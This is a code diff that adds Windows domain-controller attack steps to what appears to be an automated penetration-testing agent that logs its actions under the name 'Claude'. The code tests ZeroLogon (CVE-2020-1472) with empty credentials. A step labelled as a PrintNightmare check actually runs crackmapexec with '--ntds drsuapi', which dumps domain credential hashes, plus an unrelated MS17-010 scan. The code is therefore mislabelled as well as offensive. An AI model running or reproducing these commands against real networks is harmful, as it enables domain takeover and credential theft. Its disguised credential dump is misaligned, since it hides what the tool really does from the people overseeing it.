@@ -12596,6 +12596,47 @@ PRIORITIES (strict order): exploit_confirmed_vuln > dump_creds_post_exploit > ch
         if user and pwd:
             self._bloodhound_ad_chain(target, user, pwd, accumulated_output)
 
+        # ── G2: ZeroLogon (CVE-2020-1472) ────────────────────────────────────
+        # Check if this is a DC (port 88 or Kerberos service)
+        _last_ports = self._last_open_ports if hasattr(self, "_last_open_ports") else []
+        _port_nums_w = {p["port"] if isinstance(p, dict) else p for p in _last_ports}
+        if 88 in _port_nums_w or 389 in _port_nums_w:
+            self._log(f"[Claude] WIN-POST: Probando ZeroLogon CVE-2020-1472 en {target}")
+            zl_out, _ = self._run_cmd(
+                "win-zerologon",
+                f"# ZeroLogon CVE-2020-1472 check\n"
+                f"python3 -c \"\n"
+                f"import subprocess, sys\n"
+                f"# Use impacket zerologon if available\n"
+                f"r = subprocess.run(['python3', '/opt/impacket/examples/zerologon_tester.py', \n"
+                f"    '{target}', '{target}'], capture_output=True, text=True, timeout=15)\n"
+                f"print(r.stdout[:200] or r.stderr[:100])\n"
+                f"\" 2>/dev/null || "
+                f"crackmapexec smb {target} -u '' -p '' --zerologon 2>/dev/null | head -10",
+                target, timeout=30,
+            )
+            if re.search(r'vuln|success|ZEROLOGON|MACHINE_ACCOUNT|CONFIRMED', zl_out, re.IGNORECASE):
+                self._capture_evidence(zl_out, target, "win-zerologon", "CVE-2020-1472")
+                accumulated_output.append(f"=== ZeroLogon CVE-2020-1472 ===\n{zl_out[:400]}")
+                self._save_findings([{
+                    "title": f"ZeroLogon CVE-2020-1472 Vulnerable @ {target}",
+                    "severity": "critical",
+                    "description": f"Posible ZeroLogon — el DC no requiere firma Netlogon.\n{zl_out[:300]}",
+                    "cve": "CVE-2020-1472",
+                }], target)
+
+        # ── G3: PrintNightmare check (CVE-2021-34527) ─────────────────────────
+        if 445 in _port_nums_w and user and pwd:
+            pn_out, _ = self._run_cmd(
+                "win-printnightmare",
+                f"crackmapexec smb {target} -u '{user}' -p '{pwd}' "
+                f"--ntds drsuapi 2>/dev/null | grep -i 'printnightmare\\|spoolsv\\|spoolss' | head -5; "
+                f"nmap -p 445 --script smb-vuln-ms17-010 {target} 2>/dev/null | grep VULNERABLE | head -3",
+                target, timeout=30,
+            )
+            if pn_out.strip():
+                accumulated_output.append(f"=== PrintNightmare check ===\n{pn_out[:300]}")
+
     # ─────────────────────────────────────────────────────────────────────────
     # Active Directory attacks (Kerberoasting, AS-REP, BloodHound)
     # ─────────────────────────────────────────────────────────────────────────
